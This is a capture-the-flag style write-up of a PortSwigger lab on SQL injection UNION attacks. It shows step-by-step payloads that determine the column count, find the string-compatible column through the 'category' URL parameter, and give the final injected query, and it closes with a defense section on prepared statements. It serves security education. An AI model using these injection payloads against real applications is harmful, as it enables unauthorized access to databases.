# 📘 PortSwigger Lab: SQL injection UNION attack, finding a column containing text

<a id="top"></a>

> 🔗 Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

---

# 📑 Table of Contents

- [🎯 Goal](#goal)
- [🧠 Attack idea](#idea)
- [🏗 What is already known](#how)
- [🔍 Step 1 — Find column count](#step1)
- [🔍 Step 2 — Find string column](#step2)
- [🔍 Step 3 — Successful payload](#step3)
- [💥 Why the attack worked](#why)
- [🛡 Defense](#defense)
- [🛠 Checklist](#checklist)

---

<a id="goal"></a>

# 🎯 Goal

Find a column that:
- accepts string values;
- is visible in the response.

---

<a id="idea"></a>

# 🧠 Attack idea

`UNION SELECT` allows us to inject our own data into SQL query results.

Our goal:
- make the application display:
```text
jEa1F5
```

---

<a id="how"></a>

# 🏗 What is already known

From the previous lab:

```sql
UNION SELECT NULL,NULL,NULL--
```

✅ Worked

This means:
# the SELECT query contains 3 columns.

---

<a id="step1"></a>

# 🔍 Step 1 — Find column count

```sql
UNION SELECT NULL--
```

❌ Error

```sql
UNION SELECT NULL,NULL--
```

❌ Error

```sql
UNION SELECT NULL,NULL,NULL--
```

✅ Success

---

# Conclusion

Column count:
# 3

---

<a id="step2"></a>

# 🔍 Step 2 — Find string column

Now we need to identify the column
that accepts text values.

---

# Test first column

```http
/filter?category=Accessories' UNION SELECT 'jEa1F5',NULL,NULL--
```

❌ String not visible

---

# Test second column

```http
/filter?category=Accessories' UNION SELECT NULL,'jEa1F5',NULL--
```

✅ String visible

---

# Test third column

```http
/filter?category=Accessories' UNION SELECT NULL,NULL,'jEa1F5'--
```

❌ String not visible

---

# Conclusion

The second column is:
- string-compatible;
- visible in the response.

---

<a id="step3"></a>

# 🔍 Step 3 — Successful payload

Final payload:

```http
/filter?category=Accessories' UNION SELECT NULL,'jEa1F5',NULL--
```

---

# Final SQL query

```sql
SELECT name,description,price FROM products
WHERE category='Accessories'
UNION SELECT NULL,'jEa1F5',NULL--'
```

---

# What happened

The application displayed:

```text
jEa1F5
```

The lab was solved.

---

<a id="why"></a>

# 💥 Why the attack worked

Because the application:
- inserted user input directly into SQL;
- did not use prepared statements;
- displayed SQL results to the user.

---

<a id="defense"></a>

# 🛡 Defense

- Prepared Statements
- Parameterized Queries
- Input Validation
- Least Privilege
- WAF

Safe example:

```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category=?");
```

---

<a id="checklist"></a>

# 🛠 Checklist

- [ ] SQL Injection identified
- [ ] column count determined
- [ ] visible column identified
- [ ] string-compatible datatype found
- [ ] injected data displayed

---

# ⬆ Back to top

[Return to top](#top)
